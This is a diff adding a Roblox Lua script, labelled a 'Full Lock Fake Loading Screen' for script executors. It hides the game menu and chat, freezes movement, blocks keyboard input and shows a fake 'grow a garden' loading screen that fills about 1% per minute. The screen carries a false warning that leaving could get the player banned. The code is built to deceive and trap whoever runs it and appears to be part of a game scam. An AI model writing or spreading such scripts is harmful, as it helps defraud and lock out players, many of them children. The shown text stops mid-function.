@@ -1,0 +1,137 @@
+-- Full Lock Fake Loading Screen (Executor Version)
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Remove old GUI
+if playerGui:FindFirstChild("CustomLoadingScreen") then
+    playerGui.CustomLoadingScreen:Destroy()
+end
+
+-- ===== Force Hide Menu & Chat =====
+pcall(function()
+    StarterGui:SetCore("TopbarEnabled", false)
+end)
+
+pcall(function()
+    local topbar = CoreGui:FindFirstChild("TopBar", true)
+    if topbar then
+        topbar.Enabled = false
+        topbar.Parent = nil
+    end
+end)
+
+pcall(function()
+    local chat = CoreGui:FindFirstChild("Chat", true)
+    if chat then
+        chat.Enabled = false
+        chat.Parent = nil
+    end
+end)
+
+-- ===== Freeze Player Movement =====
+local function freezeMovement()
+    local char = player.Character or player.CharacterAdded:Wait()
+    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+    end
+end
+freezeMovement()
+player.CharacterAdded:Connect(freezeMovement)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        return Enum.ContextActionResult.Sink
+    end
+end)
+
+-- ===== Create Loading Screen =====
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "CustomLoadingScreen"
+loadingGui.IgnoreGuiInset = true
+loadingGui.ResetOnSpawn = false
+loadingGui.Parent = playerGui
+
+-- Black background
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = loadingGui
+
+-- Red warning
+local redWarning = Instance.new("TextLabel")
+redWarning.Size = UDim2.new(1, 0, 0, 60)
+redWarning.Position = UDim2.new(0, 0, 0.15, 0)
+redWarning.BackgroundTransparency = 1
+redWarning.Text = "!! Loading the script grow a garden wait it carefully finish !!"
+redWarning.TextColor3 = Color3.fromRGB(255, 0, 0)
+redWarning.TextScaled = true
+redWarning.Font = Enum.Font.SourceSansBold
+redWarning.Parent = frame
+
+-- Purple warning (flashing)
+local purpleWarning = Instance.new("TextLabel")
+purpleWarning.Size = UDim2.new(0.9, 0, 0, 50)
+purpleWarning.Position = UDim2.new(0.05, 0, 0.25, 20)
+purpleWarning.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
+purpleWarning.Text = "⚠ Don't leave in the game while loading the screen you might ban in the Game ⚠"
+purpleWarning.TextColor3 = Color3.fromRGB(255, 255, 0)
+purpleWarning.TextWrapped = true
+purpleWarning.TextScaled = true
+purpleWarning.Font = Enum.Font.SourceSansBold
+purpleWarning.Parent = frame
+
+-- Flashing effect loop
+task.spawn(function()
+    while true do
+        purpleWarning.Visible = true
+        task.wait(0.5)
+        purpleWarning.Visible = false
+        task.wait(0.5)
+    end
+end)
+
+-- Loading percentage
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0, 50)
+loadingText.Position = UDim2.new(0, 0, 0.5, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading: 0%"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.Parent = frame
+
+-- Music
+local music = Instance.new("Sound")
+music.Name = "LoadingMusic"
+music.SoundId = "rbxassetid://142376088" -- Raining Tacos
+music.Looped = true
+music.Volume = 0.5 -- 50% volume
+music.Parent = frame
+music:Play()
+
+-- ===== Fake Slow Loading =====
+local percent = 0
+local delayPerPercent = 60 -- 1% per minute
+
+task.spawn(function()
+    while percent < 100 do
+        percent += 1
+        loadingText.Text = "Loading: " .. percent .. "%"
+        task.wait(delayPerPercent)
+    end
+
+    -- Restore UI after done
+    music:Stop()
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", true)
+    end)
+    loadingGui:Destroy()
